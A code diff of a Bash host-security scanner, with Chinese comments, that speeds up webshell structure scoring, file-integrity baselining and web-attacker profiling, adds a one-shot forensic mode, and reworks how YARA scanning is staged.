@@ -4883,30 +5577,40 @@ scan_web_static_structures() {
             [ -n "${static_hash_by_path[$path]:-}" ] || static_hash_by_path["$path"]="$projection_hash"
         done < <(tail -n +2 "${RAW_DIR}/binary-analysis-projection.tsv")
     fi
+    # 有界静态分析器已经完整解析并判定为 OBSERVE 的文件不再用 Bash 重新
+    # 逐个评分（每个文件约 9 个子进程）；静态分析未覆盖的文件仍走 Bash 评分。
+    declare -A static_analyzed_observe=()
+    if [ -r "${RAW_DIR}/static-analysis-projection.tsv" ]; then
+        while IFS=$'\t' read -r observe_path _lang observe_class _rest; do
+            [ "$observe_class" = OBSERVE ] && [ -n "$observe_path" ] && static_analyzed_observe["$observe_path"]=1
+        done < <(tail -n +2 "${RAW_DIR}/static-analysis-projection.tsv")
+    fi
     if [ -s "$STATIC_WEB_CANDIDATE_FILE" ]; then
         while IFS= read -r path; do
             if [ "$STATIC_PIPELINE_DEADLINE" -gt 0 ] && [ "$SECONDS" -ge "$STATIC_PIPELINE_DEADLINE" ]; then
                 mark_current_module_partial static_pipeline_budget_exhausted_before_shell_scoring
                 break
             fi
+            [ -z "${static_analyzed_observe[$path]:-}" ] || { count=$((count + 1)); continue; }
             result=$(web_static_structure_score "$path"); IFS=$'\t' read -r score reasons entropy long_line <<< "$result"
             [ "$score" -gt 0 ] || { count=$((count + 1)); continue; }
             hash="${static_hash_by_path[$path]:-}"; [ -n "$hash" ] || hash=$(sha256_file "$path" 2>/dev/null || true)
             owner=$(file_package_owner "$path")
-            printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$path" "$score" "$reasons" "$entropy" "$long_line" "$hash" "${owner:-unowned}" "independent:yara-results.jsonl" >> "$out"
+            printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$path" "$score" "$reasons" "$entropy" "$long_line" "$hash" "${owner:-unowned}" "static-structure" >> "$out"
             if [ "$score" -ge 4 ]; then
                 record_find MEDIUM webshell "Web 文件静态结构异常: $path" \
-                    "score=${score}; structures=${reasons}; entropy=${entropy}; long_line=${long_line}; sha256=${hash}; package=${owner:-unowned}; yara=independent" \
+                    "score=${score}; structures=${reasons}; entropy=${entropy}; long_line=${long_line}; sha256=${hash}; package=${owner:-unowned}; pipeline=static-structure" \
                     '与文件基线、HTTP 访问、Web 进程执行和网络行为关联；静态结构本身不判定 WebShell' 'T1505.003' \
                     'WEB-STATIC-STRUCTURE' "$path" 'web-static-analysis.tsv,file-inventory-current.tsv' 'SECURITY_ANOMALY' MEDIUM \
                     '命中多层解码、动态函数构造、反射或解码后执行结构；高熵与长行只作为辅助' \
                     '若文件为基线新增/修改并被请求、执行，随后派生 Shell 或外连，应升级' 'WEB,FILE,INTEGRITY' \
-                    "反证：包归属=${owner:-unowned}，YARA 结果独立保存，维护窗口=${MAINTENANCE_ACTIVE}" \
+                    "反证：包归属=${owner:-unowned}，静态结构评分独立判定，维护窗口=${MAINTENANCE_ACTIVE}" \
                     "$RUN_STARTED_AT|FILE|static structure score=$score path=$path"
             fi
             count=$((count + 1))
         done < "$STATIC_WEB_CANDIDATE_FILE"
     fi
+    benchmark_stage_end static_shell_scoring
     STATIC_PIPELINE_DEADLINE=0; STATIC_STAGE_TIMEOUT=0
     record_raw_status 'web-static-analysis.tsv' SUCCESS filesystem ''
 }
@@ -4922,7 +5626,43 @@ correlate_web_attack_chain() {
     # Access logs generally have no PID.  Preserve them as web-entity context;
     # never attach ProcessGuid/process_instance_id merely because a URI or a
     # filename resembles another event.
-    if [ -r "${RAW_DIR}/web-access-normalized.tsv" ]; then
+    # v2.2 批处理 + F3 攻击者画像：单次 Python 遍历替代逐行 bash 循环
+    # （原 2-4 fork/行 × ≤5000 行 ≈ 1-2 万 fork ≈ 30-80s），分类语义逐条保真。
+    local post_static_file="${RAW_DIR}/.post-static.${RUN_ID}"
+    : > "$post_static_file"
+    if [ -r "${RAW_DIR}/web-access-normalized.tsv" ] && command -v python3 >/dev/null 2>&1 && [ -r "$WEB_CORRELATE_PATH" ]; then
+        run_with_timeout 60 python3 "$WEB_CORRELATE_PATH" \
+            --normalized "${RAW_DIR}/web-access-normalized.tsv" \
+            --changes "${RAW_DIR}/file-changes.tsv" \
+            --context-out "$context_file" \
+            --post-static-out "$post_static_file" \
+            --profile-out "${RAW_DIR}/web-attacker-profile.tsv" \
+            --profile-json "${RAW_DIR}/web-attacker-profile.json" \
+            > "${RAW_DIR}/web-correlate.log" 2>&1 || \
+            mark_current_module_partial web_correlate_batch_failed
+        post_static=$(cat "$post_static_file" 2>/dev/null)
+        rm -f "$post_static_file"
+        # F3 攻击者画像 finding：Top 攻击源聚合（观察级，不进 IOC）
+        if [ -s "${RAW_DIR}/web-attacker-profile.tsv" ]; then
+            record_raw_status 'web-attacker-profile.tsv' SUCCESS web ''
+            record_raw_status 'web-attacker-profile.json' SUCCESS web ''
+            local attacker_summary attacker_top
+            attacker_summary=$(awk -F '\t' 'NR>1 {a[$1]=$2; t+=$2; n++} END {printf "%d|%d", n, t}' "${RAW_DIR}/web-attacker-profile.tsv" 2>/dev/null)
+            local attacker_n="${attacker_summary%%|*}" attacker_total="${attacker_summary##*|}"
+            if [ "${attacker_n:-0}" -gt 0 ] 2>/dev/null; then
+                attacker_top=$(awk -F '\t' 'NR>1 && NR<=6 {printf "%s(%s次/%s) ", $1, $2, $4}' "${RAW_DIR}/web-attacker-profile.tsv" 2>/dev/null)
+                record_find OBSERVE webshell "Web 攻击者画像：${attacker_n} 个攻击源 IP，共 ${attacker_total} 次攻击请求" \
+                    "top=${attacker_top}; full=raw/web-attacker-profile.tsv" \
+                    '结合防火墙/WAF 封禁与溯源；持续出现的高频攻击源建议拉黑观察' 'T1595' \
+                    'WEB-ATTACKER-PROFILE' 'web-attacker-profile' 'web-attacker-profile.tsv,web-attacker-profile.json,web-access-normalized.tsv' \
+                    'RUNTIME_OBSERVATION' LOW \
+                    '按客户端 IP 聚合的攻击请求画像（分类含 WebShell 探测/命令参数/元字符/备份扩展探测），扫描窗口内统计' \
+                    '同 IP 关联成功上传/执行证据时升级' 'WEB' \
+                    "counter_evidence=公网 Web 服务常态受扫描；画像为观察性统计而非入侵确认" \
+                    "$RUN_STARTED_AT|WEB|attacker-profile"
+            fi
+        fi
+    elif [ -r "${RAW_DIR}/web-access-normalized.tsv" ]; then
         while IFS=$'\t' read -r log_time source_file client_ip method uri status bytes host agent referer parse_status raw_hash; do
             [ "$log_time" = timestamp ] && continue
             reason=""; file_match=""; uri_path="${uri%%\?*}"; uri_lower=$(printf '%s' "$uri" | tr '[:upper:]' '[:lower:]')
@@ -4954,7 +5694,7 @@ correlate_web_attack_chain() {
         [[ "$pid" =~ ^[0-9]+$ ]] || continue
         starttime=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null); exe=$(readlink -f "/proc/${pid}/exe" 2>/dev/null || true)
         [ -n "$starttime$exe" ] || continue
-        instance="process:$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown):${pid}:${starttime}:${exe}"
+        instance="process:$(get_boot_id):${pid}:${starttime}:${exe}"
         network=$(socket_snapshot established | grep -E "pid=${pid}," | head -10)
         public_network=""
         while IFS= read -r conn; do
@@ -5146,6 +5886,25 @@ publish_rat_snapshot_events() {
     [ -n "$EVENT_CACHE_FILE" ] || EVENT_CACHE_FILE="${RAW_DIR}/events-normalized.jsonl"
     [ -e "$EVENT_CACHE_FILE" ] || : > "$EVENT_CACHE_FILE"
     now=$(date +%s)
+    # v2.2 批处理：单进程替代逐行 append_normalized_event（原 ~10 fork/行
+    # × ~450 行 + 每行 3 次 grep ≈ 6-7 千 fork ≈ 45-70s）。契约逐字段保真
+    # （event_id/entity/22字段 JSON 布局），失败回退 bash 循环。
+    if command -v python3 >/dev/null 2>&1 && [ -r "$SNAPSHOT_EVENTS_PATH" ]; then
+        local ev_summary persistence_list
+        persistence_list="${RAW_DIR}/crontab_all.txt,${RAW_DIR}/systemd_services.txt,${RAW_DIR}/startup_files.txt"
+        ev_summary=$(run_with_timeout 60 python3 "$SNAPSHOT_EVENTS_PATH" \
+            --process-tsv "${RAW_DIR}/process-context.tsv" \
+            --socket-tsv "$SOCKET_SNAPSHOT_FILE" \
+            --beacon-tsv "${RAW_DIR}/beacon-analysis.tsv" \
+            --persistence-files "$persistence_list" \
+            --out "$EVENT_CACHE_FILE" --epoch "$now" 2>>"${RAW_DIR}/module-correlation.log") || ev_summary=""
+        if printf '%s' "$ev_summary" | grep -qE '"status":\s*"SUCCESS"'; then
+            EVENT_COUNT=$(printf '%s' "$ev_summary" | python3 -c 'import json,sys; print(json.loads(sys.stdin.read()).get("events", 0))' 2>/dev/null || printf 0)
+            record_raw_status 'events-normalized.jsonl' SUCCESS patterns ''
+            return 0
+        fi
+        mark_current_module_partial snapshot_events_batch_failed_fallback_bash
+    fi
     if [ -r "${RAW_DIR}/process-context.tsv" ]; then
         while IFS=$'\t' read -r instance _boot pid _start ppid _comm uid _euid _loginuid _tty exe _rest; do
             [ "$instance" = process_instance_id ] && continue
@@ -5357,10 +6116,22 @@ load_file_scan_config() {
             ScanRoots) FILE_SCAN_ROOTS="$value" ;;
             Extensions) FILE_EXTENSIONS="${value#.}"; FILE_EXTENSIONS="${FILE_EXTENSIONS//,./,}" ;;
             ExcludeDirectories) FILE_EXCLUDE_NAMES="$value" ;;
+            ExcludePrefixes) FILE_EXCLUDE_PREFIXES="$value" ;;
             ApprovedHashes) FILE_APPROVED_HASHES=$(printf '%s' "$value" | tr ';' ',') ;;
             MaliciousHashes) FILE_MALICIOUS_HASHES=$(printf '%s' "$value" | tr ';' ',') ;;
         esac
     done < "$FILE_SCAN_CONFIG_FILE"
+    # v2：配置未提供恶意哈希时，从内置 IOC 哈希包加载（rules/ioc-hashes.txt，
+    # 每行一个 md5 或 sha256，# 注释）。开箱即用的哈希比对通道。
+    if [ -z "$FILE_MALICIOUS_HASHES" ] && [ -r "${PROGRAM_DIR}/rules/ioc-hashes.txt" ]; then
+        local ioc_hash
+        while IFS= read -r ioc_hash; do
+            ioc_hash="${ioc_hash%%#*}"; ioc_hash=$(printf '%s' "$ioc_hash" | tr -d '[:space:]')
+            [[ "$ioc_hash" =~ ^[0-9a-fA-F]{32}$ || "$ioc_hash" =~ ^[0-9a-fA-F]{64}$ ]] || continue
+            FILE_MALICIOUS_HASHES="${FILE_MALICIOUS_HASHES}${FILE_MALICIOUS_HASHES:+,}${ioc_hash}"
+        done < "${PROGRAM_DIR}/rules/ioc-hashes.txt"
+        [ -n "$FILE_MALICIOUS_HASHES" ] && export FILE_MALICIOUS_HASHES
+    fi
 }
 
 file_candidate_priority() {
@@ -5436,6 +6207,8 @@ csv_has_value() {
 file_is_excluded() {
     local path="$1" name
     for name in "${FILE_EXCLUDE_ARRAY[@]}"; do [ -n "$name" ] && [[ "/$path/" == *"/${name}/"* ]] && return 0; done
+    local pfx
+    for pfx in ${FILE_EXCLUDE_PREFIXES//,/ }; do [ -n "$pfx" ] && [[ "$path" == "$pfx" || "$path" == "$pfx"/* ]] && return 0; done
     return 1
 }
 
@@ -5879,20 +6652,26 @@ run_native_file_monitor() {
         --errors-output "${RAW_DIR}/file-hash-errors.tsv" --suspicious-output "${RAW_DIR}/suspicious-files.tsv" \
         --findings-output "$findings" --summary-output "$summary" --inventory-header "$inventory_header" \
         --baseline "$FILE_INVENTORY_FILE" --cache-key "$FILE_SCAN_CACHE_KEY" --cache-analyzer-version "$NATIVE_HASH_ANALYZER_VERSION" \
-        --cache-profile "$SCAN_PROFILE" --cache-max-bytes "$FILE_MAX_HASH_BYTES" --cache-rules "$FILE_SCAN_RULE_FINGERPRINT" \
+        --cache-profile "${STATE_PROFILE_KEY:-$SCAN_PROFILE}" --cache-max-bytes "$FILE_MAX_HASH_BYTES" --cache-rules "$FILE_SCAN_RULE_FINGERPRINT" \
         --max-files "$FILE_MAX_FILES" --max-bytes "$FILE_MAX_HASH_BYTES" --timeout-seconds "$FILE_TIMEOUT_SECONDS" \
         --small-priority-bytes "$FILE_SMALL_PRIORITY_BYTES" --priority-persistence-path "$FILE_PRIORITY_PERSISTENCE_PATH" \
         --approved-hashes "$FILE_APPROVED_HASHES" --malicious-hashes "$FILE_MALICIOUS_HASHES" --maintenance-active "$MAINTENANCE_ACTIVE" \
         --process-context "${RAW_DIR}/process-context.tsv" --socket-tsv "${RAW_DIR}/socket-snapshot.tsv")
+    [ -z "$FILE_HASH_INDEX_FILE" ] || native_command+=(--hash-index-out "$FILE_HASH_INDEX_FILE")
+    [ -z "$PACKAGE_INDEX_CACHE_FILE" ] || native_command+=(--package-cache "$PACKAGE_INDEX_CACHE_FILE")
+    # one-shot 取证：空基线时全量报 ADDED（否则 native 会静默建基线，changes=0）。
+    [ "$STATE_ENABLED" = true ] || native_command+=(--report-added true)
     run_with_timeout "$((FILE_TIMEOUT_SECONDS + 15))" "${native_command[@]}" >/dev/null 2> "${RAW_DIR}/file-monitor.error" || rc=$?
     [ "$rc" -eq 0 ] || return 1
     grep -Eq '\"status\"[[:space:]]*:[[:space:]]*\"(SUCCESS|PARTIAL)\"' "$summary" || return 1
     [ -s "$FILE_INVENTORY_PENDING" ] && [ -f "${RAW_DIR}/file-changes.tsv" ] && [ -f "${RAW_DIR}/file-hash-errors.tsv" ] && [ -s "${RAW_DIR}/suspicious-files.tsv" ] && [ -f "$findings" ] || return 1
+    [ -z "$FILE_HASH_INDEX_FILE" ] || [ -f "$FILE_HASH_INDEX_FILE" ] || return 1
     import_native_file_monitor_summary "$summary" || return 1
     import_native_suspicious_files_tsv "${RAW_DIR}/suspicious-files.tsv" || return 1
     import_native_file_findings_jsonl "$findings" || return 1
     record_raw_status 'file-monitor-summary.json' "$FILE_SCAN_STATUS" filesystem "native_file_monitor=${FILE_SCAN_STATUS}"
     record_raw_status 'file-findings.jsonl' "$([ -s "$findings" ] && printf SUCCESS || printf NO_RESULTS)" filesystem 'native_file_monitor'
+    [ -s "$FILE_HASH_INDEX_FILE" ] && record_raw_status 'hash-index.tsv' SUCCESS filesystem 'native_file_monitor' || true
     [ ! -s "${RAW_DIR}/file-monitor.error" ] || record_raw_status 'file-monitor.error' PARTIAL filesystem 'native_file_monitor_stderr'
     return 0
 }
@@ -5901,8 +6680,9 @@ run_native_hash_batch() {
     local priority_file="$1" sorted_priority_file="$2" native_output="${OUTPUT_DIR}/.native-file-hashes.${RUN_ID}" summary="${OUTPUT_DIR}/.native-file-hashes-summary.${RUN_ID}" rc=0 parsed=0
     local priority_score priority_mtime priority_size path priority_reasons dev inode size mtime ctime status md5 sha message
     local -a native_command=("$NATIVE_SCANNER_PATH" hash-files --input-list "$sorted_priority_file" --output "$native_output" --max-files "$FILE_MAX_FILES" --max-bytes "$FILE_MAX_HASH_BYTES" --timeout-seconds "$FILE_TIMEOUT_SECONDS")
+    [ -z "$FILE_HASH_INDEX_FILE" ] || native_command+=(--hash-index-out "$FILE_HASH_INDEX_FILE")
     [ "$FILE_SCAN_BASELINE" = true ] && native_command+=(--baseline "$FILE_INVENTORY_FILE" --cache-key "$FILE_SCAN_CACHE_KEY" \
-        --cache-analyzer-version "$NATIVE_HASH_ANALYZER_VERSION" --cache-profile "$SCAN_PROFILE" \
+        --cache-analyzer-version "$NATIVE_HASH_ANALYZER_VERSION" --cache-profile "${STATE_PROFILE_KEY:-$SCAN_PROFILE}" \
         --cache-max-bytes "$FILE_MAX_HASH_BYTES" --cache-rules "$FILE_SCAN_RULE_FINGERPRINT")
     run_with_timeout "$((FILE_TIMEOUT_SECONDS + 5))" "${native_command[@]}" > "$summary" 2>&1 || rc=$?
     [ "$rc" -eq 0 ] || { rm -f "$native_output" "$summary"; return 1; }
@@ -5934,8 +6714,15 @@ run_incremental_file_monitoring() {
     load_file_scan_config
     prepare_file_scan_matchers
     prepare_file_scan_cache_key
-    [ "$STATE_ENABLED" = true ] || { FILE_SCAN_STATUS="DISABLED_NO_STATE"; return 0; }
-    FILE_INVENTORY_FILE="${STATE_DIR}/file_inventory.${SCAN_PROFILE}.state"
+    if [ "$STATE_ENABLED" != true ]; then
+        # one-shot 取证模式：不落盘任何跨轮状态，但本轮仍是完整快照——
+        # 以空基线运行文件监控，把全部候选视为"本轮新增"，取证面不降级。
+        FILE_INVENTORY_FILE="${OUTPUT_DIR}/.oneshot-empty-baseline.${RUN_ID}"
+        : > "$FILE_INVENTORY_FILE"
+        FILE_SCAN_MODE="ONESHOT"
+    else
+        FILE_INVENTORY_FILE="${STATE_DIR}/file_inventory.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.state"
+    fi
     if [ "$SCAN_PROFILE" = daily-hunt ] && [ ! -s "$FILE_INVENTORY_FILE" ] && [ -s "${STATE_DIR}/file_inventory.state" ]; then
         cp "${STATE_DIR}/file_inventory.state" "$FILE_INVENTORY_FILE" 2>/dev/null || true
         [ ! -s "${STATE_DIR}/file_inventory.state.bak" ] || cp "${STATE_DIR}/file_inventory.state.bak" "${FILE_INVENTORY_FILE}.bak" 2>/dev/null || true
@@ -5958,40 +6745,74 @@ run_incremental_file_monitoring() {
     local inventory_header native_file_monitor_done=false
     inventory_header=$(printf '#secscope-file-inventory-v%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s' \
         "$FILE_SCAN_CACHE_SCHEMA_VERSION" "$HOST_ID" "$RUN_STARTED_AT" "$NATIVE_HASH_ANALYZER_VERSION" \
-        "$SCAN_PROFILE" "$FILE_MAX_HASH_BYTES" "$FILE_SCAN_RULE_FINGERPRINT" "$FILE_SCAN_CACHE_KEY")
+        "${STATE_PROFILE_KEY:-$SCAN_PROFILE}" "$FILE_MAX_HASH_BYTES" "$FILE_SCAN_RULE_FINGERPRINT" "$FILE_SCAN_CACHE_KEY")
     printf '%s\n' "$inventory_header" > "$FILE_INVENTORY_PENDING"
     started=$SECONDS; candidate_now_epoch=$(date +%s); IFS=',' read -r -a roots <<< "$FILE_SCAN_ROOTS"
 
     # 对全部有界候选先评分，再以分数、mtime、大小和路径形成稳定顺序。
     local priority_file="${OUTPUT_DIR}/.file-priority.${RUN_ID}" sorted_priority_file="${OUTPUT_DIR}/.file-priority-sorted.${RUN_ID}"
     : > "$priority_file"
+    local native_walk_done=false native_walk_summary="${RAW_DIR}/file-priority-walk-summary.json" native_walk_rc=0 walk_roots_file="${OUTPUT_DIR}/.file-walk-roots.${RUN_ID}"
     benchmark_stage_begin file_candidate_discovery
-    for pid_dir in /proc/[0-9]*; do
-        [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_PROC_PID_VISITS=$((BENCHMARK_PROC_PID_VISITS + 1))
-        path=$(readlink "$pid_dir/exe" 2>/dev/null); path="${path% (deleted)}"
-        [ -n "$path" ] && runtime_exe_candidates["$path"]=1
-        [ -r "$pid_dir/maps" ] || continue
-        [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_PROC_MAPS_VISITS=$((BENCHMARK_PROC_MAPS_VISITS + 1))
-        while IFS= read -r mapped_path; do [ -n "$mapped_path" ] && runtime_mapped_candidates["$mapped_path"]=1; done < <(awk 'NF>=6 && $2 ~ /x/ && substr($NF,1,1)=="/" && $NF !~ /[(]deleted[)]$/ {print $NF}' "$pid_dir/maps" 2>/dev/null)
-    done
-    for path in "${!runtime_exe_candidates[@]}" "${!runtime_mapped_candidates[@]}"; do
-        rc=0; add_scored_file_candidate "$path" || rc=$?; [ "$rc" -ne 2 ] || { stop_scan=true; break; }
-    done
-    if [ "$stop_scan" = false ]; then
-        for root in "${roots[@]}"; do
-            [ -d "$root" ] || continue
-            while IFS= read -r -d '' path; do
-                [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_FILE_TRAVERSED=$((BENCHMARK_FILE_TRAVERSED + 1))
-                rc=0; add_scored_file_candidate "$path" || rc=$?
-                [ "$rc" -ne 2 ] || { stop_scan=true; break; }
-            done < <(run_with_timeout "$FILE_TIMEOUT_SECONDS" find "$root" -xdev -maxdepth "$FILE_MAX_DEPTH" -type f -print0 2>/dev/null)
-            [ "$stop_scan" = false ] || break
-        done
+    if [ "$NATIVE_PRIORITY_WALK_READY" = true ]; then
+        : > "$native_walk_summary"
+        printf '%s\n' "${roots[@]}" > "$walk_roots_file"
+        # 单进程完成 /proc 提取 + 受限遍历 + 评分 + 排序，替代每文件多次
+        # fork 的 find+stat Bash 循环；评分与排序语义与 Bash 路径一致。
+        run_with_timeout "$((FILE_TIMEOUT_SECONDS + 5))" "$NATIVE_SCANNER_PATH" priority-candidates \
+            --roots-file "$walk_roots_file" --output-list "$sorted_priority_file" \
+            --baseline "$FILE_INVENTORY_FILE" --max-depth "$FILE_MAX_DEPTH" \
+            --max-hash-bytes "$FILE_MAX_HASH_BYTES" --timeout-seconds "$FILE_TIMEOUT_SECONDS" \
+            --small-priority-bytes "$FILE_SMALL_PRIORITY_BYTES" --recent-days "$FILE_RECENT_DAYS" \
+            --exclude-names "$FILE_EXCLUDE_NAMES" --extensions "$FILE_EXTENSIONS" \
+            --priority-added-small "$FILE_PRIORITY_ADDED_SMALL" --priority-modified "$FILE_PRIORITY_MODIFIED" \
+            --priority-runtime-exe "$FILE_PRIORITY_RUNTIME_EXE" --priority-runtime-mapped "$FILE_PRIORITY_RUNTIME_MAPPED" \
+            --priority-web-root "$FILE_PRIORITY_WEB_ROOT" --priority-tmp-executable "$FILE_PRIORITY_TMP_EXECUTABLE" \
+            --priority-persistence-path "$FILE_PRIORITY_PERSISTENCE_PATH" --priority-recent "$FILE_PRIORITY_RECENT" \
+            --priority-suspicious-extension "$FILE_PRIORITY_SUSPICIOUS_EXTENSION" \
+            --priority-just-dropped "$FILE_PRIORITY_JUST_DROPPED" \
+            --exclude-prefix "$PROGRAM_DIR" --exclude-prefix "$REPORT_ROOT" --exclude-prefix "$STATE_DIR" --exclude-prefix "$OUTPUT_DIR" \
+            $(for pfx in ${FILE_EXCLUDE_PREFIXES//,/ }; do [ -n "$pfx" ] && printf -- "--exclude-prefix %q " "$pfx"; done) \
+            > "$native_walk_summary" 2>&1 || native_walk_rc=$?
+        rm -f "$walk_roots_file"
+        if [ "$native_walk_rc" -eq 0 ]; then
+            native_walk_done=true
+            record_raw_status 'file-priority-walk-summary.json' "$(grep -q '"status":"PARTIAL"' "$native_walk_summary" && printf PARTIAL || printf SUCCESS)" filesystem 'native_priority_walk'
+        else
+            BENCHMARK_FALLBACK_COUNT=$((BENCHMARK_FALLBACK_COUNT + 1))
+            record_raw_status 'file-priority-walk-summary.json' PARTIAL filesystem "native_walk_exit_${native_walk_rc};bash_fallback_used"
+        fi
     fi
-    benchmark_stage_end file_candidate_discovery
-    benchmark_stage_begin file_candidate_sort
-    LC_ALL=C sort -t $'\t' -k1,1nr -k2,2nr -k3,3n -k4,4 "$priority_file" > "$sorted_priority_file"
-    benchmark_stage_end file_candidate_sort
+    if [ "$native_walk_done" = false ]; then
+        for pid_dir in /proc/[0-9]*; do
+            [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_PROC_PID_VISITS=$((BENCHMARK_PROC_PID_VISITS + 1))
+            path=$(readlink "$pid_dir/exe" 2>/dev/null); path="${path% (deleted)}"
+            [ -n "$path" ] && runtime_exe_candidates["$path"]=1
+            [ -r "$pid_dir/maps" ] || continue
+            [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_PROC_MAPS_VISITS=$((BENCHMARK_PROC_MAPS_VISITS + 1))
+            while IFS= read -r mapped_path; do [ -n "$mapped_path" ] && runtime_mapped_candidates["$mapped_path"]=1; done < <(awk 'NF>=6 && $2 ~ /x/ && substr($NF,1,1)=="/" && $NF !~ /[(]deleted[)]$/ {print $NF}' "$pid_dir/maps" 2>/dev/null)
+        done
+        for path in "${!runtime_exe_candidates[@]}" "${!runtime_mapped_candidates[@]}"; do
+            rc=0; add_scored_file_candidate "$path" || rc=$?; [ "$rc" -ne 2 ] || { stop_scan=true; break; }
+        done
+        if [ "$stop_scan" = false ]; then
+            for root in "${roots[@]}"; do
+                [ -d "$root" ] || continue
+                while IFS= read -r -d '' path; do
+                    [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_FILE_TRAVERSED=$((BENCHMARK_FILE_TRAVERSED + 1))
+                    rc=0; add_scored_file_candidate "$path" || rc=$?
+                    [ "$rc" -ne 2 ] || { stop_scan=true; break; }
+                done < <(run_with_timeout "$FILE_TIMEOUT_SECONDS" find "$root" -xdev -maxdepth "$FILE_MAX_DEPTH" -type f -print0 2>/dev/null)
+                [ "$stop_scan" = false ] || break
+            done
+        fi
+        benchmark_stage_end file_candidate_discovery
+        benchmark_stage_begin file_candidate_sort
+        LC_ALL=C sort -t $'\t' -k1,1nr -k2,2nr -k3,3n -k4,4 "$priority_file" > "$sorted_priority_file"
+        benchmark_stage_end file_candidate_sort
+    else
+        benchmark_stage_end file_candidate_discovery
+    fi
     benchmark_stage_begin file_hash_and_delta
     if [ "$NATIVE_FILE_MONITOR_READY" = true ] && run_native_file_monitor "$sorted_priority_file" "$inventory_header"; then
         native_file_monitor_done=true
@@ -6048,7 +6869,13 @@ run_incremental_file_monitoring() {
     record_raw_status 'suspicious-files.tsv' SUCCESS filesystem ''
     if [ "$FILE_SCAN_STATUS" = "NOT_RUN" ] && [ "$FILE_SCAN_HASH_FAILED" -gt 0 ]; then FILE_SCAN_STATUS="PARTIAL_HASH_ERRORS"; fi
     [ "$FILE_SCAN_STATUS" = "NOT_RUN" ] && FILE_SCAN_STATUS="SUCCESS"
-    [ "$FILE_SCAN_STATUS" = "SUCCESS" ] && FILE_INVENTORY_READY=true || FILE_INVENTORY_READY=false
+    # PARTIAL 轮也要提交基线：候选超上限的 K8s 主机上若只允许 SUCCESS 提交，
+    # 基线永远不会落盘，每轮都冷启动全量哈希并把全部文件误报为 ADDED。
+    # 部分 baseline 逐轮收敛（未扫文件下轮以 ADDED 出现一次后入库），严格优于永不提交。
+    case "$FILE_SCAN_STATUS" in
+        SUCCESS|PARTIAL_TIMEOUT|PARTIAL_HASH_ERRORS) FILE_INVENTORY_READY=true ;;
+        *) FILE_INVENTORY_READY=false ;;
+    esac
 }
 
 initialize_corpus_file_monitoring_artifacts() {
@@ -6079,7 +6906,7 @@ check_lightweight_temp_executables() {
         [ "$candidate_running" = no ] || { sev=HIGH; confidence=MEDIUM; }
         record_find "$sev" filesystem "临时目录代码型可执行文件: $candidate_path" \
             "type=${candidate_type}; ${candidate_meta}; running=${candidate_running}" \
-            '核对来源、哈希、创建时间、稳定进程实体和网络连接' 'T1204' 'FS-TEMP-EXECUTABLE' "$candidate_path" \
+            '核对来源、哈希、创建时间、稳定进程实体和网络连接' 'T1204' 'FS-TEMP-CODE' "$candidate_path" \
             'tmp_executables.txt,process-context.tsv,abnormal-connections.tsv' 'SECURITY_ANOMALY' "$confidence" \
             '临时目录代码文件具有较高调查价值；仅在运行或关联网络时提升优先级' \
             '若关联新增外连、Web 祖先进程、持久化或恶意哈希，应升级' 'FILE,PROCESS'
@@ -6087,9 +6914,11 @@ check_lightweight_temp_executables() {
 }
 
 save_file_inventory_state() {
+    # one-shot 取证模式：本轮数据只进报告，不写任何跨轮基线。
+    [ "$STATE_ENABLED" = true ] || return 0
     [ "$FILE_INVENTORY_READY" = true ] || return 0
     [ -s "$FILE_INVENTORY_PENDING" ] || return 1
-    local tmp="${STATE_DIR}/.file_inventory.${SCAN_PROFILE}.next.$$"
+    local tmp="${STATE_DIR}/.file_inventory.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.next.$$"
     cp "$FILE_INVENTORY_PENDING" "$tmp" || return 1
     chmod 600 "$tmp" || return 1
     [ ! -s "$FILE_INVENTORY_FILE" ] || cp "$FILE_INVENTORY_FILE" "${FILE_INVENTORY_FILE}.bak"
@@ -6163,15 +6992,6 @@ check_filesystem() {
         "$(json_quote "$SCAN_PROFILE")" "$(json_quote "${RESOURCE_PROFILE:-unknown}")" "${RESOURCE_CPU_COUNT:-0}" "${RESOURCE_MEMORY_MB:-0}" "$(json_quote "${RESOURCE_BUDGET_REASON:-unavailable}")" > "${RAW_DIR}/resource-budget.json"
     record_raw_status 'resource-budget.json' SUCCESS filesystem ''
 
-    # YARA capability is initialized before any filesystem/static scan.  This
-    # is deliberately independent from later realtime-event collection.
-    if [ "$PROFILE_YARA_ENABLED" = true ]; then
-        initialize_yara_capability
-    else
-        EVENT_SOURCE_YARA=DISABLED; YARA_CAPABILITY_ERROR="disabled_by_profile:${SCAN_PROFILE}"
-        printf '{"status":"DISABLED","profile":%s,"mode":%s}\n' "$(json_quote "$SCAN_PROFILE")" "$(json_quote "$YARA_MODE")" > "${RAW_DIR}/yara-capability.json"
-        record_raw_status 'yara-capability.json' NOT_APPLICABLE yara "$YARA_CAPABILITY_ERROR"
-    fi
     if ! resource_budget_available file_monitoring; then
         FILE_SCAN_STATUS="PARTIAL_RESOURCE_BUDGET"
         record_raw_status 'file-changes.tsv' PARTIAL filesystem 'resource budget prevented file monitoring'
@@ -6183,6 +7003,9 @@ check_filesystem() {
     else
         run_incremental_file_monitoring
     fi
+    benchmark_stage_begin yara_diff
+    run_diff_yara
+    benchmark_stage_end yara_diff
     if [ "$PROFILE_STATIC_ANALYSIS" = true ]; then
         if resource_budget_available static_analysis; then
             benchmark_stage_begin static_analysis_pipeline
@@ -6191,26 +7014,13 @@ check_filesystem() {
         else
             mark_current_module_partial static_analysis_resource_budget
         fi
-    elif [ "$PROFILE_YARA_ENABLED" = true ]; then
-        benchmark_stage_begin yara_pipeline
-        build_static_candidate_list || true
-        route_static_candidates
-        scan_yara_candidates "$STATIC_YARA_CANDIDATE_FILE"
-        benchmark_stage_end yara_pipeline
